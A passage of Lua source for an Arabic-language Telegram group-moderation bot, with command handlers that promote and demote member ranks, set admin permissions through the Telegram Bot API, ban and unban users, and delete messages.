getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and hxouse11(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_,result.id_)
delowner(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and hxouse11(msg) then
local user = text:match('تنزيل مدير (%d+)')
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_,user)
delowner(msg,msg.chat_id_,user)
end end
-----------Set Momod------------
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:sadd(HXOUSE..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
setmomod(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and hxouse11(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:sadd(HXOUSE..'bot:momod:'..msg.chat_id_,result.id_)
setmomod(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and hxouse11(msg) then
local user = text:match('رفع ادمن (%d+)')
hxousedx1:sadd(HXOUSE..'bot:momod:'..msg.chat_id_,user)
setmomod(msg,msg.chat_id_,user)
end
----------------Rem Momod-----------
if text ==('تنزيل ادمن') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
delmomod(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and hxouse11(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_,result.id_)
delmomod(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and hxouse11(msg) then
local user = text:match('تنزيل ادمن (%d+)')
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_,user)
delmomod(msg,msg.chat_id_,user)
end end
-----------Set Vipmem------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:sadd(HXOUSE..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
setvipmem(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and hxouse11(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:sadd(HXOUSE..'bot:vipmem:'..msg.chat_id_,result.id_)
setvipmem(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and hxouse11(msg) then
local user = text:match('رفع مميز (%d+)')
hxousedx1:sadd(HXOUSE..'bot:vipmem:'..msg.chat_id_,user)
setvipmem(msg,msg.chat_id_,user)
end
----------------Rem Vipmem-----------
if text ==('تنزيل مميز') and hxouse11(msg) then
function prom_reply(extra, result, success)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
delvipmem(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and hxouse11(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_,result.id_)
delvipmem(msg,msg.chat_id_,result.id_)
else 
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and hxouse11(msg) then
local user = text:match('تنزيل مميز (%d+)')
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_,user)
delvipmem(msg,msg.chat_id_,user)
end end 
-------- 
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then 
function promote_by_reply(extra, result, success)
if is_leaderid(result.sender_user_id_) == true then
hxousedx(msg.chat_id_, msg.id_, 1, "❌ لا يمكنك تنزيل المطور الاساسي ", 1, 'md')
return false 
end
if hxousedx1:sismember(HXOUSE..'bot:admins:',result.sender_user_id_) then
sudo3 = 'مطور ثالث • ' else sudo3 = '' end
if hxousedx1:sismember(HXOUSE..'bot:onall:',result.sender_user_id_) then
onall = 'مدير عام • ' else onall = '' end
if hxousedx1:sismember(HXOUSE..'bot:moall:',result.sender_user_id_) then
moall = 'ادمن عام • ' else moall = '' end
if hxousedx1:sismember(HXOUSE..'bot:vpall:',result.sender_user_id_) then
vpall = 'مميز عام • ' else vpall = '' end
if hxousedx1:sismember(HXOUSE..'bot:monsh:'..msg.chat_id_, result.sender_user_id_) then
monsh = 'منشئ اساسي •  ' else monsh = '' end
if hxousedx1:sismember(HXOUSE..'bot:monsh2:'..msg.chat_id_, result.sender_user_id_) then
monsh2 = 'منشئ • ' else monsh2 = '' end 
if hxousedx1:sismember(HXOUSE..'bot:owners:'..msg.chat_id_, result.sender_user_id_) then
owner = 'مدير • ' else owner = '' end
if hxousedx1:sismember(HXOUSE..'bot:momod:'..msg.chat_id_, result.sender_user_id_) then
momod = 'ادمن • ' else momod = '' end
if hxousedx1:sismember(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'مميز' else vipmem = ''
end
if dxdx(result.sender_user_id_,msg.chat_id_) ~= false then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم تنزيله من ↓↓\n⌯︙{ "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n⌯︙رتبته الان { عضو فقط }\n", 1, 'md')
else 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙لم يتم رفعه باي رتبه سابقا \n", 1, 'md')
end 
if fadx(msg.sender_user_id_,msg.chat_id_) == 'botow' then
hxousedx1:srem(HXOUSE..'bot:admins:', result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:onall:', result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:moall:', result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:vpall:', result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
hxousedx1:srem(HXOUSE..'bot:onall:', result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:moall:', result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:vpall:', result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'owner' then
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if is_leaderid(result.id_) == true then
hxousedx(msg.chat_id_, msg.id_, 1, "❌ لا يمكنك تنزيل المطور الاساسي ", 1, 'md')
return false 
end
if hxousedx1:sismember(HXOUSE..'bot:admins:',result.id_) then
sudo3 = 'مطور ثالث • ' else sudo3 = '' end
if hxousedx1:sismember(HXOUSE..'bot:onall:',result.id_) then
onall = 'مدير عام • ' else onall = '' end
if hxousedx1:sismember(HXOUSE..'bot:moall:',result.id_) then
moall = 'ادمن عام • ' else moall = '' end
if hxousedx1:sismember(HXOUSE..'bot:vpall:',result.id_) then
vpall = 'مميز عام • ' else vpall = '' end
if hxousedx1:sismember(HXOUSE..'bot:monsh:'..msg.chat_id_, result.id_) then
monsh = 'منشئ اساسي •  ' else monsh = '' end
if hxousedx1:sismember(HXOUSE..'bot:monsh2:'..msg.chat_id_, result.id_) then
monsh2 = 'منشئ • ' else monsh2 = '' end 
if hxousedx1:sismember(HXOUSE..'bot:owners:'..msg.chat_id_, result.id_) then
owner = 'مدير • ' else owner = '' end
if hxousedx1:sismember(HXOUSE..'bot:momod:'..msg.chat_id_, result.id_) then
momod = 'ادمن • ' else momod = '' end
if hxousedx1:sismember(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.id_) then
vipmem = 'مميز' else vipmem = ''
end
if dxdx(result.id_,msg.chat_id_) ~= false then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم تنزيله من ↓↓\n⌯︙{ "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n⌯︙رتبته الان { عضو فقط }\n", 1, 'md')
else 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙لم يتم رفعه باي رتبه سابقا \n", 1, 'md')
end 
if fadx(msg.sender_user_id_,msg.chat_id_) == 'botow' then
hxousedx1:srem(HXOUSE..'bot:admins:', result.id_)
hxousedx1:srem(HXOUSE..'bot:onall:', result.id_)
hxousedx1:srem(HXOUSE..'bot:moall:', result.id_)
hxousedx1:srem(HXOUSE..'bot:vpall:', result.id_)
hxousedx1:srem(HXOUSE..'bot:monsh:'..msg.chat_id_,result.id_)
hxousedx1:srem(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.id_)
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
hxousedx1:srem(HXOUSE..'bot:onall:', result.id_)
hxousedx1:srem(HXOUSE..'bot:moall:', result.id_)
hxousedx1:srem(HXOUSE..'bot:vpall:', result.id_)
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.id_)
hxousedx1:srem(HXOUSE..'bot:monsh:'..msg.chat_id_,result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:monsh2:'..msg.chat_id_,result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:owners:'..msg.chat_id_, result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'owner' then
hxousedx1:srem(HXOUSE..'bot:momod:'..msg.chat_id_, result.id_)
hxousedx1:srem(HXOUSE..'bot:vipmem:'..msg.chat_id_, result.id_)
end
Fsend = '⌯︙المعرف غير صحيح*'
send(msg.chat_id_, msg.id_, 1, Fsend, 1, 'md')
end
end
resolve_username(rem[2],remm)
end 
----------
-------------------------------
if text:match("^رفع ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and hxouse11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( ادمن بالكروب ) *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بالكروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and hxouse11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *ادمن الكروب* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم تنزيله ( عضو ) *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text:match("^رفع بكل الصلاحيات$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and hxouse11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم رفعه ( ادمن بالكروب بكل الصلاحيات )\n⌯︙ صلاحياته الان \n⌯︙ تغيير اسم المجموعه \n⌯︙ حذف الرسائل \n⌯︙ الدعوه بالرابط \n⌯︙ تثبيت الرسائل \n⌯︙ اضافه مشرفين *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه تغيير الاسم$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and hxouse11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم الغاء ( خاصيه تغيير الاسم )\n⌯︙ صلاحياته الان \n⌯︙ حذف الرسائل \n⌯︙ الدعوه بالرابط \n⌯︙ تثبيت الرسائل *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه التثبيت$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and hxouse11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=false&can_promote_members=false")
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم الغاء ( خاصيه التثبيت )\n⌯︙ صلاحياته الان \n⌯︙ حذف الرسائل \n⌯︙ الدعوه بالرابط *', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
----------------------------------------HXOUSE TEAM--------------------------------------------------------------       
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Dd]el$") or text:match("^مسح$") and msg.reply_to_message_id_ ~= 0 and hxouse11(msg) then
local id = msg.id_
local msgs = {[0] = id}
delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_,msgs)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم مسح الرساله مع رساله الامر ', 1, 'md')
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الحظر$") or text:match("^تفعيل الطرد$") and hxouse11(msg) then
hxousedx1:del("hxouse:lock:ban"..bot_id..msg.chat_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل الحظر ', 1, 'md')
end
if text:match("^تعطيل الحظر$") or text:match("^تعطيل الطرد$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
hxousedx1:set("hxouse:lock:ban"..bot_id..msg.chat_id_,"hxouse")
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل الحظر ', 1, 'md')
end
end
-----------------------------------------HXOUSE TEAM-----------------------------------------------------
if text:match("^حظر$") and msg.reply_to_message_id_ ~= 0 and hxouse11(msg) then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and hxousedx1:get("hxouse:lock:ban"..bot_id..msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع الحظر او الطرد \n⌯︙ لانه معطل من قبل المنشئ ', 1, 'md')
return "hxouse"
end
function ban_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:banned:'..msg.chat_id_
if not is_momod(result.sender_user_id_, result.chat_id_) then
if hxousedx1:sismember(HXOUSE..hash, result.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ is already banned ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( حظره ) سابقا*', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
else
hxousedx1:sadd(HXOUSE..hash, result.sender_user_id_)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ has been banned ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( حظره ) من المجموعه*', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end  
---------------------------------------HXOUSE TEAM--------------------------------------------------------
if text:match('^حظر @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
local ap = {string.match(text, '^(حظر) @(.*)$')}
function ban_by_username(extra, result, success)
local hash = 'bot:banned:'..msg.chat_id_
if result.id_ then 
if is_momod(result.id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع حظر او طرد الادمنيه ', 1, 'md')
else
if hxousedx1:sismember(HXOUSE..hash, result.id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( [@'..ap[2]..'] )\n⌯︙ *ايديه* ( *'..result.id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( حظره ) سابقا*', 1, 'md')
else
hxousedx1:sadd(HXOUSE..hash, result.id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( [@'..ap[2]..'] )\n⌯︙ *ايديه* ( *'..result.id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( حظره ) من المجموعه*', 1, 'md')
chat_kick(msg.chat_id_, result.id_)
end
end
end
end
resolve_username(ap[2],ban_by_username)
end
----------------------------------HXOUSE TEAM-------------------------------------------------------------
if text:match("^[Bb]an (%d+)$") and hxouse11(msg) then
local ap = {string.match(text, "^([Bb]an) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and hxousedx1:get("hxouse:lock:ban"..bot_id..msg.chat_id_) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لا تستطيع الحظر او الطرد \n⌯︙ لانه معطل من قبل المنشئ ', 1, 'md')
return "hxouse"
end
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. ap[2])
local hxouse_res = user_info_
if user_info_ then
if not is_momod(ap[2], msg.chat_id_) then
hxousedx1:sadd(HXOUSE..'bot:banned:'..msg.chat_id_, ap[2])
chat_kick(msg.chat_id_, ap[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..ap[2]..' ، 🚷\n⌯︙ has been banned ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..ap[2]..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( حظره ) من المجموعه*', 1, 'md')
end
end
end
end
-----------------------------------HXOUSE TEAM------------------------------------------------------------
local text = msg.content_.text_:gsub('مسح الكل','Delall')
if text:match("^[Dd]elall$") and msg.reply_to_message_id_ ~= 0 and hxouse11(msg) then
function delall_by_reply(extra, result, success)
del_all_msgs(result.chat_id_, result.sender_user_id_)
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,delall_by_reply)
end
---------------------------------------HXOUSE TEAM--------------------------------------------------------
if text:match("^[Dd]elall (%d+)$") and hxouse11(msg) then
local ass = {string.match(text, "^([Dd]elall) (%d+)$")}
if not ass then
return false
else
del_all_msgs(msg.chat_id_, ass[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, ' All messages from User : '..ass[2]..' has been deleted ', 1, 'html')
else
hxousedx(msg.chat_id_, msg.id_, 1, '✺❘ كل رسائل العضو : '..ass[2]..'\n ✺❘ تم حذفها ༯', 1, 'html')
end
end
end
-----------------------------------HXOUSE TEAM------------------------------------------------------------
if text:match("^[Dd]elall @(.*)$") and hxouse11(msg) then
local ap = {string.match(text, "^([Dd]elall) @(.*)$")}
function delall_by_username(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.id_)
local hxouse_res = user_info_
if user_info_ then
if result.id_ then
del_all_msgs(msg.chat_id_, result.id_)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ All messages from User ؛ '..result.id_..' ، 🚷\n⌯︙ has been deleted ༯ \nֆ                 ֆ*'
else
text = '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( مسح كل رسائله ) *'
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
text = '*⌯︙ Username is not correct *'
else
text = '⌯︙ المعرف غير صحيح *'
end
end
end
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],delall_by_username)
end
-------------------------------------HXOUSE TEAM----------------------------------------------------------
local text = msg.content_.text_:gsub('الغاء حظر','Unban')
if text:match("^[Uu]nban$") and msg.reply_to_message_id_ ~= 0 then
function hxouse(extra, result, success)
function unban_by_reply(extra, result, success)
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
local hash = 'bot:banned:'..msg.chat_id_
if not hxousedx1:sismember(HXOUSE..hash, result.sender_user_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ is not banned ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *العضو* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *لم يتم ( حظره ) سابقا*', 1, 'md')
end
else
hxousedx1:srem(HXOUSE..hash, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '*⌯︙ The User ؛ '..result.sender_user_id_..' ، 🚷\n⌯︙ has been unbanned ༯ \nֆ                 ֆ*', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *المحظور* ( ['..hxouse_res..'] )\n⌯︙ *ايديه* ( *'..result.sender_user_id_..'* )\n⌯︙ *بواسطه ( '..renk_hxouse(msg)..' )*\n⌯︙ *تم ( الغاء حظره ) من المجموعه*', 1, 'md')
